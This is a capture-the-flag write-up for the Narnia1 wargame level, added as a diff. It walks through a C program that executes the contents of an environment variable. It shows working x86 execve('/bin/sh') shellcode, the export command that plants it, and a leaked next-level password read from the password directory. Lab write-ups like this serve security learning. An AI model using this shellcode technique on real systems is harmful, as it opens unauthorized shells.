@@ -1,0 +1,106 @@
+Narnia1
+
+Given: narnia1 and narnia1.c
+
+
+
+Similar to narnia0. I started by doing a cat on narnia1.c:
+
+
+
+#include <stdio.h>
+
+
+int main()
+{
+
+	int (*ret)();
+
+
+	if(getenv("EGG")==NULL){
+    
+		printf("Give me something to execute at the env-variable EGG\n");
+
+		exit(1);
+	}
+
+
+
+	printf("Trying to execute EGG!\n");
+
+	ret = getenv("EGG");
+
+	ret();
+	return 0;
+
+}
+
+
+
+So it tries to get the environment variable EGG (which does not exist yet), assigns it to an 
+int function and tries to execute it.
+
+
+
+I found out I could set an environment variable using export:
+
+export EGG=asdf
+
+
+Running ./narnia1 at this point would cause a segmentation fault, so I know I assigned the 
+variable correctly.
+
+
+
+The next part was figuring out what code to execute to get a shell open. 
+
+I 
+found out that there are a bunch of shellcodes stored on the web and picked one up from 
+http://www.shell-storm.org/shellcode/files/shellcode-811.php. This code does execve("/bin/sh") 
+on Linux x86 which I assumed to be the case because it was an x86 program and that seems to be 
+the most common.
+
+The code was:
+
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80
+\x31\xc0\x40\xcd\x80
+
+
+
+I needed to actually turn it into bytes though, so to handle that:
+
+
+python -c print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2
+\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+
+
+And to assign it to EGG:
+
+
+export EGG=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89
+\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
+
+
+
+And then start narnia1:
+
+./narnia1
+
+
+
+Once I ran that command, it tried to run the program, executed the shellcode stored in the 
+environment variable EGG, and opened a shell.
+
+
+
+cd /etc/narnia_pass
+
+cat narnia2
+
+
+
+Password:
+
+nairiepecu
